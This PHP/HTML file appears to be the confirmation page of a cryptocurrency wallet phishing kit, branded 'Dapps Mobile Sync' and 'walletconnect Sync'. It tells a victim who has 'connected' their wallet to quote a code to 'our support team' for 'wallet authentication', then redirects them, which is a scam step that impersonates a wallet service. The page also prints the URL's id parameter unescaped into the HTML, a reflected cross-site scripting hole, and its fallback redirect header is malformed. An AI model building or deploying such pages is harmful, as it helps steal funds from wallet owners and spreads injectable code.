<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Dapps Mobile Sync</title>
    <meta name="description" content="Free Bootstrap Theme by BootstrapMade.com">
    <meta name="keywords" content="free website templates, free bootstrap themes, free template, free bootstrap, free website template">
    <link href='https://fonts.googleapis.com/css?family=Lobster|Open+Sans:400,400italic,300italic,300|Raleway:300,400,600' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="../success/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="../success/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="../success/css/animate.css">
    <link rel="stylesheet" type="text/css" href="../success/css/style.css">
</head>
<?php

if(isset($_GET['id'])){
    $id=$_GET['id'];

?>
<script type="text/javascript">
    var count = 10;
    var redirect = "../index.html";

    function countDown() {
        var timer = document.getElementById("countdown");
        if (count > 0) {
            count--;
            timer.innerHTML = '<div class="sec">' + count + '<span>Seconds</span></div>';
            setTimeout("countDown()", 1000);
        } else {
            window.location.href = redirect;
        }
    }

</script>
     
    <style>
    .txt{
                color: #fff;
            }
    #bar {
    text-align: center;
    margin: 20px 0px 0px;
    min-height: 104px;
}</style>

<body>
    <div class="content">
        <div class="container wow fadeInUp delay-03s">
            <div class="row">
                <div class="logo text-center">
                    <img src="../assets/logo.svg" alt="logo" width="150">
                    <h2>Connected successfully</h2>
                </div>
                <div class="text-center">
                    <h4>Kindly Contact Our Support team with this code <?=$id?> for  wallet authentication</h4>
                </div>
                
                
                <div id="bar">
<img src='https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=<?=$id?>&choe=UTF-8' title='wallectaccessUpdate-<?=$id?>'>
                    
                    </div>
                <div class="text-center">
                    <h4>You will be directed in the next</h4>
                </div>
                <div id="countdown">
                    <script type="text/javascript">
                        countDown();

                    </script>
                    <br>
                    
                </div>
                


                <footer class="footer">
                    <div class="container">
                        <div class="row bort">

                            <div class="copyright">
                                © Copyright <?php echo date("Y");?> walletconnect Sync. All Rights Reserved.
                                <div class="credits">
                                   
                                </div>
                            </div>

                        </div>
                    </div>
                </footer>

                <script src="../success/js/jquery.min.js"></script>
                <script src="../success/js/bootstrap.min.js"></script>
                <script src="../success/js/jquery.countdown.min.js"></script>
            </div>
        </div>
    </div>

</body>

</html>
<?php
}
    else{
        header("location ../index.html");
        exit;
        
    }
    ?>
